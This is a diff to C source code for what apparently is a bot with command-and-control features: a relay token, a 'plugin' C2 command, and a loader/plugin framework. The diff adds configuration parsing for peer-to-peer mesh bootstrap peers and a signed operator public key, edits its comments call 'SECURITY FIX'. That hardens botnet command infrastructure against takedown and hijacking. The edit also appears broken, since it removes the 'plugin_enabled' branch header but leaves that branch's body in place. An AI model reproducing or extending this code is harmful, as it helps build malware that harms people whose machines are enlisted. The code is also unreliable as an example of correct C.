@@ -3746,6 +3746,14 @@ void tls_cleanup(void) {
 
 #endif /* TLS_ENABLED */
 
+/* Small hex-digit helper for config validation (mesh pubkey etc.). */
+static int hexval_mesh(int c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
 /* ── Config Loading ──────────────────────────────────────────── */
 int load_config(notnet_bot_t *bot, const char *path) {
     FILE *f = fopen(path, "r");
@@ -4081,7 +4089,36 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "relay_token") == 0) {
             strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
             bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
-        } else if (strcmp(key, "plugin_enabled") == 0) {
+        } else if (strncmp(key, "mesh_static_peers_", 18) == 0) {
+            /* SECURITY FIX (#139): static bootstrap peers for the P2P
+             * mesh, mesh_static_peers_1..N = host:port. */
+            int idx = atoi(key + 18);
+            if (idx >= 1 && idx <= MESH_PEER_MAX) {
+                strncpy(bot->mesh_static_peers[idx - 1], value,
+                        sizeof(bot->mesh_static_peers[0]) - 1);
+                bot->mesh_static_peers[idx - 1][sizeof(bot->mesh_static_peers[0]) - 1] = '\0';
+            }
+        } else if (strcmp(key, "mesh_enabled") == 0) {
+            bot->mesh_enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "mesh_port") == 0) {
+            int v = atoi(value);
+            if (v >= 1 && v <= 65535) bot->mesh_port = (uint16_t)v;
+        } else if (strcmp(key, "mesh_operator_pubkey") == 0) {
+            /* SECURITY FIX (#139): operator ed25519 pubkey (64 hex).
+             * Validated at mesh_start(); rejected if not 64 hex. */
+            int valid = (strlen(value) == 64);
+            if (valid) {
+                for (const char *p = value; *p; p++) {
+                    int h = hexval_mesh(*p);
+                    if (h < 0) { valid = 0; break; }
+                }
+            }
+            if (valid) {
+                strncpy(bot->mesh_operator_pubkey, value, 64);
+                bot->mesh_operator_pubkey[64] = '\0';
+            } else {
+                log_warn("Config: mesh_operator_pubkey rejected — need 64 hex chars");
+            }
             /* SECURITY FIX (#92): loader/plugin framework toggle. The
              * built-in plugin registry is bootstrapped at boot and the
              * `plugin` C2 command dispatches plugins by name. */
